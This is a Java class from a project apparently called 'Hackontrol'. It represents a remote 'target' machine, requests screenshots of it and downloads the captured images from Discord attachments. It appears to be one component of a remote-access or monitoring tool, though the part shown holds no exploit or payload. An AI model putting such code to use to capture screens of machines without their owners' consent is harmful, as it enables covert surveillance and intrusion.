package com.khopan.hackontrol;

import java.awt.image.BufferedImage;
import java.io.InputStream;

import javax.imageio.ImageIO;

import com.khopan.hackontrol.target.ScreenshotListener;

import net.dv8tion.jda.api.entities.Message.Attachment;

public class Target {
	private final Hackontrol hackontrol;
	private final MachineId identifier;

	boolean connected;

	private ScreenshotListener screenshotListener;

	public Target(Hackontrol hackontrol, MachineId identifier) {
		this.hackontrol = hackontrol;
		this.identifier = identifier;
		this.connected = true;
	}

	public MachineId getMachineIdentifier() {
		return this.identifier;
	}

	public ScreenshotListener getScreenshotListener() {
		return this.screenshotListener;
	}

	public void setScreenshotListener(ScreenshotListener listener) {
		this.screenshotListener = listener;
	}

	public void screenshot() {
		this.check();
		this.hackontrol.request.screenshot();
	}

	void screenshotTaken(Attachment attachment) {
		new Thread(() -> {
			BufferedImage image;

			try {
				InputStream stream = attachment.getProxy().download().get();
				image = ImageIO.read(stream);
			} catch(Throwable ignored) {
				return;
			}

			if(this.screenshotListener != null) {
				this.screenshotListener.screenshotTaken(image);
			}
		}).start();
	}

	private void check() {
		if(!this.connected) {
			throw new IllegalStateException("Target was disconnected!");
		}
	}
}
